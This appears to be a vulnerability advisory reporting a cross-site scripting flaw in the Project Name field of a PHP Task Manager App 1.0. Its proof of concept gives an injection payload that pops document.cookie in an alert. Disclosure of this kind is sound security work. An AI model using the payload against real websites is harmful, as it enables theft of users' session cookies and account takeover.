# Task Manager App - Cross-Site-Scripting -1
+ *Exploit Title:* Task Manager App - Cross-Site-Scripting -1
+ *Date:* 2024-02-02
+ *Exploit Author:* Burak Sevben
+ *Vendor Homepage:* https://code-projects.org/task-manager-in-php-with-source-code/
+ *Software Link:* https://download.code-projects.org/details/97b61777-5089-4b4f-841f-10e10be5859e
+ *Version:* 1.0
+ *Tested on:* Kali Linux + PHP 8.2.12, Apache 2.4.58
+ *CVE:* Reported, waiting for CVE number

## Description:
Task Manager App is vulnerable to a cross-site scripting vulnerability because it fails to adequately sanitize user-supplied data. An attacker could exploit this issue to run arbitrary scripting code in an unsuspecting user's browser in the context of the affected site. This could allow an attacker to steal cookie-based authentication credentials and launch other attacks.

## Proof of Concept:
+ Go to http://localhost/TaskManager/Projects.php
+ Click on Project Name
+ Write this payload : `"><img src=x onerror=alert(document.cookie)>`
+ Then click Submit button
+ XSS will be triggered.

![Ekran görüntüsü 2024-02-02 181302](https://github.com/BurakSevben/CVEs/assets/117217689/4b67cdb2-a2fe-47ef-bebd-6e4ca43a2a88)

![Ekran görüntüsü 2024-02-02 181315](https://github.com/BurakSevben/CVEs/assets/117217689/c29f3456-7551-4b04-9770-c562f4d677af)
